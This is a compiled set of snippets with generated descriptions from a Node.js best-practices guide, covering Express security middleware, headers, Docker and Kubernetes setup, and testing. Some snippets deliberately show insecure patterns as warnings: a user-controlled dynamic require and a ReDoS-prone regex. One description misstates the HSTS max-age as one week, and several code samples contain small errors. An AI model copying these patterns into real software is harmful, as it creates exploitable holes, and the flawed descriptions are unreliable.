DESCRIPTION: This JavaScript snippet demonstrates how to integrate a validation middleware into an Express route. It shows a POST route where a generic validator middleware, configured with the Product.validate method, is executed before the main request handler. This middleware is responsible for validating the incoming request body and handling validation failures (e.g., returning HTTP 400 Bad Request).
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/validation.french.md#_snippet_2

LANGUAGE: javascript
CODE:
```
// The validator is a generic middleware that gets the entity it should validate and takes care to return
// HTTP status 400 (Bad Request) should the body payload validation fail
router.post('/' , **validator(Product.validate)**, async (req, res, next) => {
    // route handling code goes here
});

```

----------------------------------------

TITLE: Handling Production Errors with Express
DESCRIPTION: This Express middleware function is designed to handle errors in a production environment. It sets the response status code based on the error or defaults to 500, renders a generic 'error' view, and deliberately provides an empty 'error' object to avoid exposing sensitive details like stack traces to the client, enhancing security. It assumes an Express app instance ('app') and a view engine are configured.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/hideerrors.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// production error handler
// no stacktraces leaked to user
app.use((err, req, res, next) => {
    res.status(err.status || 500);
    res.render('error', {
        message: err.message,
        error: {}
    });
});
```

----------------------------------------

TITLE: Applying Validation Middleware in Express (JavaScript)
DESCRIPTION: Shows how to apply a generic validation middleware function (`validator`) to an Express route. This middleware executes `Product.validate` and is responsible for checking the request body payload and returning a 400 status code if validation fails, preventing the route handler from processing invalid data.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/validation.md#_snippet_2

LANGUAGE: javascript
CODE:
```
// The validator is a generic middleware that gets the entity it should validate and takes care to return
// HTTP status 400 (Bad Request) should the body payload validation fail
router.post('/' , **validator(Product.validate)**, async (req, res, next) => {
    // route handling code goes here
});

```

----------------------------------------

TITLE: Illustrating Stateful Server Anti-Patterns in Node.js
DESCRIPTION: This snippet presents three common Node.js code examples that introduce statefulness into a server. It shows using `multer` for local file uploads, `session-file-store` for local file-based session storage, and directly modifying the global object for caching. These practices create dependencies on the server's local state, hindering scalability and making servers non-disposable.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/bestateless.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// Typical mistake 1: saving uploaded files locally on a server
const multer = require('multer'); // express middleware for handling multipart uploads
const upload = multer({ dest: 'uploads/' });

app.post('/photos/upload', upload.array('photos', 12), (req, res, next) => {});

// Typical mistake 2: storing authentication sessions (passport) in a local file or memory
const FileStore = require('session-file-store')(session);
app.use(session({
    store: new FileStore(options),
    secret: 'keyboard cat'
}));

// Typical mistake 3: storing information on the global object
Global.someCacheLike.result = { somedata };
```

----------------------------------------

TITLE: Setting and Reading NODE_ENV in Bash and Node.js
DESCRIPTION: This code snippet demonstrates the common practice of setting the NODE_ENV environment variable in a Bash shell before starting a Node.js process. It then shows how to access this variable within the Node.js application using `process.env.NODE_ENV` to apply environment-specific logic, such as enabling performance features like caching when in 'production' mode.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/setnodeenv.korean.md#_snippet_0

LANGUAGE: bash
CODE:
```
$ NODE_ENV=development
$ node
```

LANGUAGE: javascript
CODE:
```
if (process.env.NODE_ENV === “production”)
    useCaching = true;
```

----------------------------------------

TITLE: Setting HSTS Header: HTTP Header
DESCRIPTION: This header example sets the HTTP Strict Transport Security (HSTS) policy. It specifies that browsers should only interact with the site via HTTPS for the next 2592000 seconds (one week) and applies this rule to all subdomains. This protects against protocol downgrade attacks and cookie hijacking.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_0

LANGUAGE: HTTP Header
CODE:
```
Strict-Transport-Security: max-age=2592000; includeSubDomains
```

----------------------------------------

TITLE: Running JavaScript Code Using Node Sandbox Library
DESCRIPTION: This snippet demonstrates how to use the `sandbox` npm library to execute JavaScript code within an isolated environment. It provides examples showing how the sandbox handles cases like syntax errors, attempts to access restricted global objects (like `process`), and infinite loops, preventing the code from affecting the main application or running indefinitely.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/sandbox.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const Sandbox = require('sandbox');
const s = new Sandbox();

s.run('lol)hai', (output) => {
  console.log(output);
  //output='Syntax error'
});

// Example 4 - Restricted code
s.run('process.platform', (output) => {
  console.log(output);
  //output=Null
});

// Example 5 - Infinite loop
s.run('while (true) {}', (output) => {
  console.log(output);
  //output='Timeout'
});
```

----------------------------------------

TITLE: Illustrating Docker Build Tagging Effects on :latest Bash
DESCRIPTION: This snippet demonstrates how building a Docker image with different tagging strategies impacts whether the `:latest` tag is updated. Building with a specific version tag (`:0.1`, `:0.2`) does not update `:latest`, whereas building without an explicit tag or explicitly with `:latest` does update it. This highlights the non-static nature of the `:latest` tag.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/image-tags.french.md#_snippet_0

LANGUAGE: bash
CODE:
```
docker build -t company/image_name:0.1 .
# :latest image is not updated
docker build -t company/image_name
# :latest image is updated
docker build -t company/image_name:0.2 .
# :latest image is not updated
docker build -t company/image_name:latest .
# :latest image is updated
```

----------------------------------------

TITLE: Logging to Console (stdout) - Winston - JavaScript
DESCRIPTION: Shows the recommended practice of configuring a logger to send output streams to the console (stdout) using the Winston library's Console transport. This allows the execution environment (like a container orchestrator or cloud platform) to capture the standard output and route it to desired log aggregation systems. The application is decoupled from specific log destinations.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/logrouting.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const logger = new winston.Logger({
  level: 'info',
  transports: [
    new (winston.transports.Console)()
  ]
});

logger.log('info', 'Test Log Message with some parameter %s', 'some parameter', { anything: 'This is metadata' });
```

----------------------------------------

TITLE: Javascript Anti-pattern: Missing Argument Bug
DESCRIPTION: This code shows a common anti-pattern where function arguments are not validated. The `redirectToPrintDiscount` function expects three arguments but is called with only two. Javascript allows this, resulting in the third argument (`discount`) being `undefined`. The condition `if (discount != 0)` evaluates to true for `undefined`, leading to an incorrect redirection and a hidden bug because the function does not 'fail fast' on invalid input.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/failfast.md#_snippet_1

LANGUAGE: javascript
CODE:
```
// if the discount is positive let's then redirect the user to print his discount coupons
function redirectToPrintDiscount(httpResponse, member, discount) {
    if (discount != 0) {
        httpResponse.redirect(`/discountPrintView/${member.id}`);
    }
}

redirectToPrintDiscount(httpResponse, someMember);
// forgot to pass the parameter discount, why the heck was the user redirected to the discount screen?
```

----------------------------------------

TITLE: Avoiding Dynamic Module Loading in JavaScript
DESCRIPTION: Demonstrates an insecure pattern where a module is required using a variable whose value might be controlled by user input, contrasting it with the secure approach of using a static file path. Using dynamic paths from untrusted sources can lead to security vulnerabilities like path traversal.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/safemoduleloading.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// insecure, as helperPath variable may have been modified by user input
const badWayToRequireUploadHelpers = require(helperPath);

// secure
const uploadHelpers = require('./helpers/upload');
```

----------------------------------------

TITLE: Illustrating Insecure vs Secure Module Loading in Node.js Javascript
DESCRIPTION: This snippet contrasts an insecure method of requiring a module using a variable (risky if `helperPath` comes from user input) with a secure method using a static file path. Using static paths prevents attackers from controlling which file is loaded.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/safemoduleloading.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// insecure, as helperPath variable may have been modified by user input
const badWayToRequireUploadHelpers = require(helperPath);

// secure
const uploadHelpers = require('./helpers/upload');
```

----------------------------------------

TITLE: Testing Unhandled Promise Error Scenarios (Javascript)
DESCRIPTION: Provides examples of different promise creation and handling patterns (`.then` with throw, `.catch` with throw, `new Promise` with throw) to illustrate which types of errors might or might not be automatically logged or caught by default mechanisms in modern JavaScript environments, emphasizing the need for explicit handling.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/catchunhandledpromiserejection.korean.md#_snippet_2

LANGUAGE: javascript
CODE:
```
Promise.resolve(‘promised value’).then(() => {
  throw new Error(‘error’);
});

Promise.reject(‘error value’).catch(() => {
  throw new Error(‘error’);
});

new Promise((resolve, reject) => {
  throw new Error(‘error’);
});

```

----------------------------------------

TITLE: Setting CSP Header: HTTP Header
DESCRIPTION: This header example sets a basic Content-Security-Policy (CSP). It allows the browser to load and execute scripts only from the same origin (`'self'`), helping to mitigate Cross-site scripting (XSS) attacks.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_7

LANGUAGE: HTTP Header
CODE:
```
Content-Security-Policy: script-src 'self'
```

----------------------------------------

TITLE: Applying Rate Limiting Middleware in Express.js
DESCRIPTION: This code shows how to use the `express-rate-limit` middleware in an Express.js application. It configures a limiter to allow a maximum of 100 requests every 15 minutes and applies this limiter specifically to routes starting with '/user/'. It also includes configuration for trusting proxies.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/limitrequests.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const RateLimit = require('express-rate-limit');
// important if behind a proxy to ensure client IP is passed to req.ip
app.enable('trust proxy'); 
 
const apiLimiter = new RateLimit({
  windowMs: 15*60*1000, // 15 minutes
  max: 100,
});
 
// only apply to requests that begin with /user/
app.use('/user/', apiLimiter);
```

----------------------------------------

TITLE: Reading NODE_ENV Environment Variable (JavaScript)
DESCRIPTION: This JavaScript snippet shows how to access the value of the NODE_ENV environment variable within a Node.js application using the built-in 'process.env' object. It demonstrates a common pattern of checking if the environment is 'production' to enable performance optimizations like caching. This approach allows the application's behavior to be dynamically configured based on the deployment environment without code changes.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/setnodeenv.md#_snippet_1

LANGUAGE: javascript
CODE:
```
// Reading the environment variable using code
if (process.env.NODE_ENV === 'production')
    useCaching = true;
```

----------------------------------------

TITLE: Creating HTTP Server with Express App - JavaScript
DESCRIPTION: This code snippet shows how to create an HTTP server instance that uses the previously defined Express application. It requires the `app` module, retrieves the desired port from environment variables (defaulting to 3000), sets the port on the Express app, and finally creates the server using `http.createServer()`. This setup is typically done in a file dedicated to server initialization (like `/bin/www`).
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/separateexpress.korean.md#_snippet_1

LANGUAGE: javascript
CODE:
```
var app = require('../app');
var http = require('http');

/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || '3000');
app.set('port', port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);
```

----------------------------------------

TITLE: Structuring System by Business Components - Bash
DESCRIPTION: This snippet illustrates a recommended project structure where the root directory contains 'apps' for business components (like orders, users) and 'libraries' for generic, reusable functionality (like logger, authenticator). This promotes modularity and reduces coupling.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
my-system
├─ apps (components)
│  ├─ orders
│  ├─ users
│  ├─ payments
├─ libraries (generic cross-component functionality)
│  ├─ logger
│  ├─ authenticator
```

----------------------------------------

TITLE: Testing Exception Throwing using Mocha & Chai (Javascript)
DESCRIPTION: This snippet demonstrates how to use Mocha's test structure with Chai's `expect` assertion library to verify that a function throws a specific error type (`ConnectionError`) under certain conditions. It shows using `.bind()` to correctly capture the function call context for the `.to.throw()` assertion. This requires the Mocha and Chai testing libraries.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/testingerrorflows.md#_snippet_0

LANGUAGE: javascript
CODE:
```
describe("Facebook chat", () => {
  it("Notifies on new chat message", () => {
    const chatService = new chatService();
    chatService.participants = getDisconnectedParticipants();
    expect(chatService.sendMessage.bind({ message: "Hi" })).to.throw(ConnectionError);
  });
});
```

----------------------------------------

TITLE: Deciding to Exit on uncaughtException (Node.js)
DESCRIPTION: This snippet demonstrates how to listen for the 'uncaughtException' event in Node.js. It uses a hypothetical error handler to process the error and then checks if the error is considered 'trusted' or operational (based on a custom 'isOperational' property). If the error is not trusted, the process is exited with a non-zero status code, allowing a process manager to restart the application.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/shuttingtheprocess.chinese.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
//收到未捕获的异常时，决定是否要崩溃
//如果开发人员标记已知的操作型错误使用：error.isOperational=true， 查看最佳实践 #3
process.on('uncaughtException', function(error) {
 errorManagement.handler.handleError(error);
 if(!errorManagement.handler.isTrustedError(error))
 process.exit(1)
});


//封装错误处理相关逻辑在集中的错误处理中
function errorHandler(){
 this.handleError = function (error) {
 return logger.logError(err).then(sendMailToAdminIfCritical).then(saveInOpsQueueIfCritical).then(determineIfOperationalError);
 }

 this.isTrustedError = function(error)
 {
 return error.isOperational;
 }

}
```

----------------------------------------

TITLE: Setting X-Content-Type-Options Header: HTTP Header
DESCRIPTION: This header example sets the X-Content-Type-Options policy to `nosniff`. This prevents the browser from performing MIME sniffing and forces it to use the content type declared in the HTTP headers, mitigating potential security risks from incorrectly interpreted files.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_4

LANGUAGE: HTTP Header
CODE:
```
X-Content-Type-Options: nosniff
```

----------------------------------------

TITLE: Implementing JSON-Schema Validation in a Class (JavaScript)
DESCRIPTION: Demonstrates adding a `validate` method to a JavaScript class (`Product`) that utilizes the `jsonschema` library to check if the instance data conforms to a defined schema. Requires the `jsonschema` library and a schema definition.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/validation.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const JSONValidator = require('jsonschema').Validator;

class Product {

  validate() {
    const v = new JSONValidator();

    return v.validate(this, schema);
  }

  static get schema() {
    //define JSON-Schema, see example above
  }
}

```

----------------------------------------

TITLE: Example Hierarchical Configuration Structure JSON5
DESCRIPTION: This JSON5 snippet demonstrates a hierarchical configuration structure. Configuration keys are logically grouped into sections (e.g., 'Customer') and subsections ('dbConfig', 'credit') to improve readability and maintainability, making it easier to find and manage settings in large configuration files compared to a flat structure. It includes comments for better context.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/configguide.md#_snippet_0

LANGUAGE: json5
CODE:
```
{
  // Customer module configs 
  "Customer": {
    "dbConfig": {
      "host": "localhost",
      "port": 5984,
      "dbName": "customers"
    },
    "credit": {
      "initialLimit": 100,
      // Set low for development 
      "initialDays": 1
    }
  }
}
```

----------------------------------------

TITLE: Layering Within a Business Component - Bash
DESCRIPTION: This snippet shows how to structure a single business component (component-a) using a 3-tier pattern. It separates concerns into 'entry-points' (API, message queues), 'domain' (business logic), and 'data-access' (database interactions) to improve maintainability and testability.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
my-system
├─ apps (components)
│  ├─ component-a
   │  ├─ entry-points
   │  │  ├─ api # controller comes here
   │  │  ├─ message-queue # message consumer comes here
   │  ├─ domain # features and flows: DTO, services, logic
   │  ├─ data-access # DB calls w/o ORM
```

----------------------------------------

TITLE: Avoiding Dynamic Labels Early - Dockerfile
DESCRIPTION: This snippet illustrates placing a dynamic label, such as a build number, near the top of a Dockerfile. This practice is discouraged because the label changes on every build, invalidating the cache for all subsequent layers below it, hindering caching benefits.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.french.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
FROM node:10.22.0-alpine3.11 as builder

# Don't do that here!
LABEL build_number="483"

#... Rest of the Dockerfile
```

----------------------------------------

TITLE: Detecting non-literal RegExp JavaScript
DESCRIPTION: This snippet illustrates a regular expression pattern that can potentially be vulnerable to catastrophic backtracking, leading to a Regular Expression Denial of Service (ReDoS) attack. Security linters identify such complex or potentially insecure regex patterns that might consume excessive resources on certain inputs. It is recommended to test and simplify complex regular expressions.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/lintrules.md#_snippet_3

LANGUAGE: JavaScript
CODE:
```
const unsafe = new RegExp('/(x+x+)+y/)');
```

----------------------------------------

TITLE: Multi-Stage Build with App Compilation & Caching - Dockerfile
DESCRIPTION: This multi-stage Dockerfile example focuses on optimizing caching when the application requires a compilation step (e.g., TypeScript). It follows the caching strategy by installing stable dependencies early, then copying source code and running the build. The final stage efficiently copies only the compiled output and necessary dependencies.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.french.md#_snippet_4

LANGUAGE: Dockerfile
CODE:
```
FROM node:10.22.0-alpine3.11 as builder

RUN apk add --no-cache \
    build-base \
    gcc \
    g++ \
    make

USER node
WORKDIR /app
COPY "package.json" "package-lock.json" "./"
RUN npm ci
COPY . .
RUN npm run build


FROM node as app

USER node
WORKDIR /app
# Only copying the files that we need
COPY --from=builder /app/node_modules node_modules
COPY --from=builder /app/package.json .
COPY --from=builder /app/dist dist
RUN npm prune --production

CMD ["node", "dist/server.js"]
```

----------------------------------------

TITLE: Limiting JSON Payload Size using Express Middleware
DESCRIPTION: Demonstrates how to configure the `express.json` middleware to restrict the maximum allowed size of incoming JSON request bodies. This helps protect the application from large payloads that could consume excessive resources. It also shows an optional manual check for the Content-Type header.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/requestpayloadsizelimit.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const express = require('express');

const app = express();

app.use(express.json({ limit: '300kb' })); // body-parser defaults to a body size limit of 100kb

// Request with json body
app.post('/json', (req, res) => {

    // Check if request payload content-type matches json, because body-parser does not check for content types
    if (!req.is('json')) {
        return res.sendStatus(415); // -> Unsupported media type if request doesn't have JSON body
    }

    res.send('Hooray, it worked!');
});

app.listen(3000, () => console.log('Example app listening on port 3000!'));
```

----------------------------------------

TITLE: Testing Site Update with Per-Test Data - JavaScript
DESCRIPTION: This snippet demonstrates the recommended practice of setting up test data directly within the test case. It creates a new site record using `SiteService.addSite` specifically for this test before performing an update operation and asserting the result. This ensures the test is independent and predictable.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/avoid-global-test-fixture.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
it('When updating site name, get successful confirmation', async () => {
  //Arrange - test is adding a fresh new records and acting on the records only
  const siteUnderTest = await SiteService.addSite({
    name: 'siteForUpdateTest'
  });

  //Act
  const updateNameResult = await SiteService.changeName(siteUnderTest, 'newName');

  //Assert
  expect(updateNameResult).to.be(true);
});
```

----------------------------------------

TITLE: Limit Node.js Memory Usage (Shell)
DESCRIPTION: This command executes a Node.js script (server.js) with the --max_old_space_size flag set to 400. This limits the V8 engine's old space memory heap to approximately 400MB, which can help control memory consumption and reduce the frequency and duration of garbage collection pauses, particularly on systems with limited memory. Prerequisites: Node.js installed.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/measurememory.korean.md#_snippet_0

LANGUAGE: Shell
CODE:
```
node –max_old_space_size=400 server.js –production
```

----------------------------------------

TITLE: Configuring Kubernetes Memory Limits and V8 Flag in YAML
DESCRIPTION: This Kubernetes Pod definition snippet demonstrates setting both memory `requests` (minimum guarantee) and `limits` (maximum cap) for a container within the `resources` block. It also shows how to pass the V8 `--max-old-space-size` flag to the Node.js process via the container's `command` array. Setting both container limits and the V8 flag is essential for effective memory management in Kubernetes.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/memory-limit.french.md#_snippet_1

LANGUAGE: YAML
CODE:
```
apiVersion: v1
kind: Pod
metadata:
  name: my-node-app
spec:
  containers:
  - name: my-node-app
    image: my-node-app
    resources:
      requests:
        memory: "400Mi"
      limits:
        memory: "500Mi"
    command: ["node index.js --max-old-space-size=350"]
```

----------------------------------------

TITLE: Setting Kubernetes Container & V8 Memory Limits - YAML
DESCRIPTION: This Kubernetes Deployment YAML configuration defines memory requests and limits for a container running a Node.js application. It also includes the V8 `--max-old-space-size` flag in the command to set the V8 heap limit, demonstrating how to configure both levels of memory constraints within a Kubernetes manifest.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/memory-limit.md#_snippet_1

LANGUAGE: YAML
CODE:
```
apiVersion: v1
kind: Pod
metadata:
  name: my-node-app
spec:
  containers:
  - name: my-node-app
    image: my-node-app
    resources:
      requests:
        memory: "400Mi"
      limits:
        memory: "500Mi"
    command: ["node index.js --max-old-space-size=350"]
```

----------------------------------------

TITLE: Demonstrating Explicit Module Entry Points in Node.js JavaScript
DESCRIPTION: This snippet illustrates the best practice of defining explicit entry points for modules. It contrasts directly requiring internal files (avoid) with exporting public functionality via a main file like `index.js` and requiring the module directory, making the client code less coupled to the module's internal structure and easier to refactor.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_6

LANGUAGE: javascript
CODE:
```
// Avoid: client has deep familiarity with the internals

// Client code
const SMSWithMedia = require("./SMSProvider/providers/media/media-provider.js");

// Better: explicitly export the public functions

//index.js, module code
module.exports.SMSWithMedia = require("./SMSProvider/providers/media/media-provider.js");

// Client code
const { SMSWithMedia } = require("./SMSProvider");
```

----------------------------------------

TITLE: Configuring Nginx Request Body Limit Nginx
DESCRIPTION: This configuration snippet shows how to use the `client_max_body_size` directive in Nginx to limit the maximum allowed size of the client request body. This directive can be applied globally within the `http` block, for a specific virtual host within a `server` block, or for a particular URL path within a `location` block.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/requestpayloadsizelimit.french.md#_snippet_1

LANGUAGE: Nginx
CODE:
```
http {
    ...
    # Limit the body size for ALL incoming requests to 1 MB
    client_max_body_size 1m;
}

server {
    ...
    # Limit the body size for incoming requests to this specific server block to 1 MB
    client_max_body_size 1m;
}

location /upload {
    ...
    # Limit the body size for incoming requests to this route to 1 MB
    client_max_body_size 1m;
}
```

----------------------------------------

TITLE: Forwarding Signals with Tini Dockerfile
DESCRIPTION: This Dockerfile snippet demonstrates using the `tini` process manager as the container's entrypoint. `tini` acts as PID 1, ensuring proper signal handling and forwarding (like SIGTERM) to the Node.js application running as its child process (`CMD`). This pattern is recommended for robust signal management in containerized environments, requiring `tini` to be added and made executable in the image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/graceful-shutdown.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

# Build logic comes here

ENV TINI_VERSION v0.19.0
ADD https://github.com/krallin/tini/releases/download/${TINI_VERSION}/tini /tini
RUN chmod +x /tini
ENTRYPOINT ["/tini", "--"]

CMD ["node", "index.js"]
#Now Node will run a sub-process of TINI which acts as PID1

```

----------------------------------------

TITLE: Excluding Files from npm Publish (.npmignore)
DESCRIPTION: This snippet provides an example of a `.npmignore` file. It lists files and directories that should be explicitly excluded when publishing an npm package, acting as a blacklist. This helps prevent unwanted or sensitive files from being included in the distributed package.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/avoid_publishing_secrets.md#_snippet_0

LANGUAGE: text
CODE:
```
# Tests
test
coverage

# Build tools
.travis.yml
.jenkins.yml

# Environment
.env
.config

```

----------------------------------------

TITLE: Generating Heap Dump via HTTP Endpoint - Node.js
DESCRIPTION: This Node.js snippet, using Express, sets up an HTTP GET route '/ops/heapdump'. After checking if the request is authorized, it generates a heap dump using the 'heapdump' library, reads the resulting file, and sends its content back as the response. Dependencies include 'heapdump', Express (via 'router'), potentially 'fs' for file operations, and a logger.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/createmaintenanceendpoint.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const heapdump = require('heapdump');

// Check if request is authorized 
function isAuthorized(req) {
    // ...
}

router.get('/ops/heapdump', (req, res, next) => {
    if (!isAuthorized(req)) {
        return res.status(403).send('You are not authorized!');
    }

    logger.info('About to generate heapdump');

    heapdump.writeSnapshot((err, filename) => {
        console.log('heapdump file is ready to be sent to the caller', filename);
        fs.readFile(filename, "utf-8", (err, data) => {
            res.end(data);
        });
    });
});
```

----------------------------------------

TITLE: Importing Built-in Node.js Modules using 'node:' Protocol (JavaScript)
DESCRIPTION: Shows the standard ES module import syntax for importing core Node.js modules with the 'node:' prefix. This practice distinguishes native modules from npm packages, helps prevent typosquatting vulnerabilities, and can be enforced with linters.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_8

LANGUAGE: javascript
CODE:
```
import { functionName } from "node:module"; // note that 'node:' prefix
```

----------------------------------------

TITLE: Cleaning npm Cache in Dockerfile Build
DESCRIPTION: This Dockerfile snippet shows how to clean the npm package cache immediately after installing dependencies. This step helps reduce the final Docker image size as the cache is not needed after the initial build stage. It uses `npm cache clean --force` to ensure the command succeeds reliably.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/clean-cache.french.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm cache clean --force

# The rest comes here
```

----------------------------------------

TITLE: Configuring Nginx Client Max Body Size
DESCRIPTION: Illustrates how to use the `client_max_body_size` directive in Nginx configuration files. This directive sets the maximum allowed size of the client request body. It can be set in the http, server, or location context, applying the limit globally, per server, or per specific route.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/requestpayloadsizelimit.md#_snippet_1

LANGUAGE: nginx
CODE:
```
http {
    ...
    # Limit the body size for ALL incoming requests to 1 MB
    client_max_body_size 1m;
}

server {
    ...
    # Limit the body size for incoming requests to this specific server block to 1 MB
    client_max_body_size 1m;
}

location /upload {
    ...
    # Limit the body size for incoming requests to this route to 1 MB
    client_max_body_size 1m;
}
```

----------------------------------------

TITLE: Avoiding Frequent LABEL Changes in Dockerfile
DESCRIPTION: Shows a Dockerfile snippet where a frequently changing `LABEL` instruction is placed near the top. This placement incorrectly invalidates the build cache for all subsequent layers, demonstrating a practice to avoid for cache optimization.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
#Beginning of the file
FROM node:10.22.0-alpine3.11 as builder

# Don't do that here!
LABEL build_number="483"

#... Rest of the Dockerfile
```

----------------------------------------

TITLE: Building Lean Node.js Docker Image - Dockerfile
DESCRIPTION: Illustrates a multi-stage Docker build for a Node.js application, separating build dependencies and artifacts from the final production image. The first stage builds the application, and the second stage copies only the necessary files and installs production dependencies. This results in a smaller, more secure image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.hebrew.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:14.4.0 AS build

COPY . .
RUN npm ci && npm run build


FROM node:slim-14.4.0

USER node
EXPOSE 8080

COPY --from=build /home/node/app/dist /home/node/app/package.json /home/node/app/package-lock.json ./
RUN npm ci --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Installing and Scanning Docker Images with Trivy (Bash)
DESCRIPTION: Provides a sequence of Bash commands to install the Trivy vulnerability scanner on a Linux system using deb package installation and then demonstrates scanning a specified Docker image name. This process requires the `rpm` package manager dependency and internet access to download the Trivy deb file.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/scan-images.french.md#_snippet_0

LANGUAGE: Bash
CODE:
```
$ sudo apt-get install rpm\n$ wget https://github.com/aquasecurity/trivy/releases/download/{TRIVY_VERSION}/trivy_{TRIVY_VERSION}_Linux-64bit.deb\n$ sudo dpkg -i trivy_{TRIVY_VERSION}_Linux-64bit.deb\n$ trivy image [YOUR_IMAGE_NAME]
```

----------------------------------------

TITLE: Multi-Stage Dockerfile for Node.js with Build Step (e.g., TypeScript)
DESCRIPTION: Shows a complete multi-stage Dockerfile example for a Node.js application that includes a separate build step like TypeScript compilation. It follows caching best practices by installing dependencies early and structuring the build stage, then copying only the necessary artifacts (`node_modules`, `dist`, `package.json`) to the final, slimmer app stage.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.md#_snippet_4

LANGUAGE: Dockerfile
CODE:
```
#Create node image version alias
FROM node:10.22.0-alpine3.11 as builder

RUN apk add --no-cache \
    build-base \
    gcc \
    g++ \
    make

USER node
WORKDIR /app
COPY "package.json" "package-lock.json" "./"
RUN npm ci
COPY . .
RUN npm run build


FROM node as app

USER node
WORKDIR /app
# Only copying the files that we need
COPY --from=builder /app/node_modules node_modules
COPY --from=builder /app/package.json .
COPY --from=builder /app/dist dist
RUN npm prune --production

CMD ["node", "dist/server.js"]
```

----------------------------------------

TITLE: Full Multi-Stage Node.js Docker Build with Alpine
DESCRIPTION: This comprehensive multi-stage Dockerfile explicitly defines steps for copying dependency files separately before installing dependencies, then copies source code, and finally builds the application in the first stage. The second stage uses a minimal Alpine image, copies necessary production files and built artifacts from the build stage, and installs production dependencies.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.french.md#_snippet_3

LANGUAGE: dockerfile
CODE:
```
# Start with fully-featured Node.js base image
FROM node:14.4.0 AS build

USER node
WORKDIR /home/node/app

# Copy dependency information and install all dependencies
COPY --chown=node:node package.json yarn.lock ./

RUN yarn install --frozen-lockfile

# Copy source code (and all other relevant files)
COPY --chown=node:node src ./src

# Build code
RUN yarn build


# Run-time stage
FROM node:14.4.0-alpine

# Set non-root user and expose port 8080
USER node
EXPOSE 8080

WORKDIR /home/node/app

# Copy dependency information and install production-only dependencies
